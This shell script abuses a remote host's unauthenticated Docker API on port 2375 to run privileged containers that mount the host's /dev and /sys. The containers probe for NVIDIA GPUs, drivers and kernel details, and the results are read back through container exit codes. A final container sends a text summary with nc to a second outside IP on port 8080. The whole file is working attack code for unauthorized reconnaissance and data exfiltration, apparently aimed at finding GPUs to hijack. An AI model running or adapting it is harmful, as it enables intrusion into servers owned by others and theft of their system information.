#!/bin/sh
# throwaway 3: GPU truth, via channels that cannot hang.
#
# Learned the hard way on attempt 2: busybox wget has NO default timeout, so a
# container whose only output is a wget callback can hang forever and its exit
# code never lands. So encode the answer in the EXIT CODE (count of matching
# device nodes), and use nc (which we pass -w to) for text.
H=134.209.121.89
B=167.233.74.146
N=`echo probe$$ | tr -cd 'a-z0-9'`
D1="exit \$(ls /host/dev/nvidia* 2>/dev/null | wc -l)"
D2="exit \$(ls /host/sys/class/drm 2>/dev/null | wc -l)"
D3="[ -r /proc/driver/nvidia/version ] && exit 1 || exit 0"
run() {
    n=$1; d=$2
    curl -sS -m 8 -X DELETE "http://$H:2375/containers/$n?force=1" >/dev/null 2>&1
    body="{\"Image\":\"busybox:1.36\",\"Cmd\":[\"sh\",\"-c\",\"$d\"],\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/dev:/host/dev\",\"/sys:/host/sys\"]}}"
    curl -sS -m 20 -X POST "http://$H:2375/containers/create?name=$n" -H 'Content-Type: application/json' -d "$body" >/dev/null 2>&1
    curl -sS -m 10 -o /dev/null -X POST "http://$H:2375/containers/$n/start" 2>/dev/null
}
run ndev_$N "$D1"
run drm_$N "$D2"
run drv_$N "$D3"
sleep 14
for n in ndev_$N drm_$N drv_$N; do
    st=$(curl -sS -m 8 "http://$H:2375/containers/$n/json" 2>/dev/null)
    echo "$n exit=$(printf %s "$st" | grep -o '"ExitCode":[0-9-]*' | head -1) fin=$(printf %s "$st" | grep -o '"FinishedAt":"[^"]*"' | head -1)"
done
echo "== interpretation: nvidia_devices / drm_nodes / has_driver(1=yes)"
echo "== text via nc (no wget hang)"
curl -sS -m 8 -X DELETE "http://$H:2375/containers/txt_$N?force=1" >/dev/null 2>&1
TX="o=dev:; for f in /host/dev/nvidia*; do o=\$o\$f,; done; o=\$o-drv:\$(cat /proc/driver/nvidia/version 2>/dev/null | head -1); o=\$o-kern:\$(uname -r); o=\$o-drm:\$(ls /host/sys/class/drm 2>/dev/null | tr '\n' ,); o=\$(printf %s \"\$o\" | tr ' ' +); printf 'GET /note?m='\$o' HTTP/1.0\r\n\r\n' | nc -w 4 $B 8080"
body="{\"Image\":\"busybox:1.36\",\"Cmd\":[\"sh\",\"-c\",\"$TX\"],\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/dev:/host/dev\",\"/sys:/host/sys\"]}}"
curl -sS -m 20 -X POST "http://$H:2375/containers/create?name=txt_$N" -H 'Content-Type: application/json' -d "$body" >/dev/null 2>&1
echo "txt_start=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' -X POST "http://$H:2375/containers/txt_$N/start" 2>/dev/null)"
sleep 8
st=$(curl -sS -m 8 "http://$H:2375/containers/txt_$N/json" 2>/dev/null)
echo "txt exit=$(printf %s "$st" | grep -o '"ExitCode":[0-9-]*' | head -1) fin=$(printf %s "$st" | grep -o '"FinishedAt":"[^"]*"' | head -1)"
echo "== notes"; tail -4 /tmp/_nestd.notes 2>/dev/null
date -u
